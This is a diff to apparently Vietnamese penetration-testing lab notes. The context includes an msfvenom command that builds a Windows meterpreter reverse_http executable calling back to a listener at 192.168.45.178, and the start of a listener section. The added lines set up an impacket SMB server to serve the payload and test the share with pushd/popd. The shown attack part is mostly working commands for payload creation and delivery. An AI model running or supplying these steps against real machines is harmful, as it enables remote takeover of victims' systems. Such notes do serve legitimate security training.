@@ -11,6 +11,21 @@ Lưu ý chụp lại các đoạn có IP của máy Debug sau khi đã khai thá
 $ msfvenom -p windows/meterpreter/reverse_http HOST=192.168.45.178 LPORT=4343 -f exe -o met.exe
 ```
 
+Để tạo SMB server
+```
+sudo smbserver.py met /home/kali/ -smb2support
+```
+
+Khi đã chạy smb server thành công thì có thể kiểm tra bằng lệnh sau:
+```
+pushd <Đường dẫn UNC>
+# VD: pushd \\ubuntu\folder
+# Khi đó trong terminal sẽ hiện lên folder của bên máy đang chạy SMB 
+
+# Thoát đường dẫn
+popd <Đường dẫn UNC>
+```
+
 Để tạo listener trên máy kali khi thực thi shellcode:
 ```
 # Exploit after met.exe execution
